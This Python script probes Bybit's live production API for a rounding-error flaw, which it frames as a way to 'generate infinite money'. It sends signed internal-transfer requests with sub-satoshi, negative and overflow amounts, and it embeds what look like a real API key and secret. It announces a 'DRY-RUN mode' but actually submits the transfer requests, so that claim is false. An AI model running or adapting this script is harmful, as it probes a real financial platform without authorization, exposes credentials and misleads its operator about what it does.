#!/usr/bin/env python3
"""
Rounding Error Attack Test
Based on HackerOne #176461 - XBT Platform Rounding Error

Scenario:
- Transfer very small amounts (below minimum precision)
- System rounds down to 0 for fee calculation
- But credits full amount to recipient
- Repeat to generate infinite money

Test on Bybit: Try internal transfer of 0.00000001 BTC (1 satoshi)
"""
import subprocess
import time
import hmac
import hashlib
import json

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

def get_server_time():
    try:
        cmd = ["curl", "-s", f"{BASE_URL}/v5/market/time"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        data = json.loads(result.stdout)
        return int(data['time'])
    except:
        return int(time.time() * 1000)

OFFSET = get_server_time() - int(time.time() * 1000)

def get_signature(payload, api_secret):
    return hmac.new(bytes(api_secret, "utf-8"), bytes(payload, "utf-8"), hashlib.sha256).hexdigest()

def send_post_request(endpoint, params):
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "5000"
    
    params_str = json.dumps(params)
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = [
        "-H", f"X-BAPI-API-KEY: {API_KEY}",
        "-H", f"X-BAPI-SIGN: {signature}",
        "-H", "X-BAPI-SIGN-TYPE: 2",
        "-H", f"X-BAPI-TIMESTAMP: {timestamp}",
        "-H", f"X-BAPI-RECV-WINDOW: {recv_window}",
        "-H", "Content-Type: application/json"
    ]
    
    cmd = ["curl", "-s", "-X", "POST"] + headers + ["-d", params_str, f"{BASE_URL}{endpoint}"]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        return json.loads(result.stdout)
    except:
        return {}

print("="*80)
print("ROUNDING ERROR / BUSINESS LOGIC TEST")
print("="*80)

# 1. Test Minimum Transfer Amount
print("\n[1] Testing Minimum Transfer Amounts")
print("WARNING: This is DRY-RUN mode. No actual transfers will be made.")
print("We check API responses for validation errors.\n")

test_amounts = [
    "0.00000001",  # 1 satoshi (BTC minimum unit)
    "0.000000001", # Below satoshi
    "0.5",         # Half unit (should round?)
    "-0.00000001", # Negative (should fail, but check response)
]

# Test endpoint: /v5/asset/transfer/inter-transfer (internal transfer between accounts)
for amount in test_amounts:
    params = {
        "fromAccountType": "UNIFIED",
        "toAccountType": "SPOT",
        "coin": "BTC",
        "amount": amount
    }
    
    print(f"Testing amount: {amount} BTC")
    res = send_post_request("/v5/asset/transfer/inter-transfer", params)
    
    ret_code = res.get('retCode')
    ret_msg = res.get('retMsg', '')
    
    if ret_code == 0:
        print(f"  🚨 ACCEPTED! Transfer of {amount} BTC was processed!")
        print(f"  Response: {res}")
    elif "minimum" in ret_msg.lower() or "invalid amount" in ret_msg.lower():
        print(f"  ✅ Rejected: {ret_msg}")
    elif ret_code == 131228:  # Insufficient balance (expected for this test)
        print(f"  ⚠️  Would be accepted if balance existed: {ret_msg}")
    else:
        print(f"  Code {ret_code}: {ret_msg}")

# 2. Test Precision Overflow
print("\n\n[2] Testing Precision Overflow")
overflow_amounts = [
    "99999999999999999999.99999999",  # Max digits
    "0.123456789012345678",           # More decimals than supported
]

for amount in overflow_amounts:
    params = {
        "fromAccountType": "UNIFIED",
        "toAccountType": "SPOT",
        "coin": "USDT",
        "amount": amount
    }
    
    print(f"Testing amount: {amount} USDT")
    res = send_post_request("/v5/asset/transfer/inter-transfer", params)
    
    ret_code = res.get('retCode')
    if ret_code == 0:
        print(f"  🚨 OVERFLOW ACCEPTED!")
    else:
        print(f"  Code {ret_code}: {res.get('retMsg', '')[:60]}")

# 3. Test Fee Calculation Edge Case
print("\n\n[3] Checking Fee Structure on Small Amounts")
# Query fee rate for transfers
res = send_post_request("/v5/account/fee-rate", {"category": "spot", "symbol": "BTCUSDT"})
print(f"Fee Rate Response: {res.get('retCode')} - {res.get('retMsg', '')}")
if res.get('result'):
    print(f"Fee details: {str(res.get('result'))[:200]}")

print("\n" + "="*80)
print("BUSINESS LOGIC TEST COMPLETE")
print("\nNOTE: Actual exploitation would require funding account and")
print("observing balance changes for rounding discrepancies.")
print("="*80)
